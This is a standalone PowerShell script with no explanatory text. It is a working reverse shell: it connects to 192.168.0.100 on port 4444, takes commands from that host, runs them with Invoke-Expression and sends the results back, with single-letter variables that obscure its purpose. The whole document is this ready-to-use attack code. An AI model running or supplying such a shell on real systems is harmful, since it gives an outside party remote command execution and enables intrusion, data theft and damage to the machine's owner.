$a="192.168.0.100";$b=4444
$c=New-Object System.Net.Sockets.TCPClient($a,$b)
$d=$c.GetStream()
[byte[]]$e=0..65535|%{0}
$f=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ')
$d.Write($f,0,$f.Length)
while(($g=$d.Read($e,0,$e.Length))-ne 0){
$h=([text.encoding]::ASCII).GetString($e,0,$g)
$i=try{Invoke-Expression $h 2>&1|Out-String}catch{$_}
$j=$i+'PS '+(Get-Location).Path+'> '
$k=([text.encoding]::ASCII).GetBytes($j)
$d.Write($k,0,$k.Length)
$d.Flush()}
$c.Close()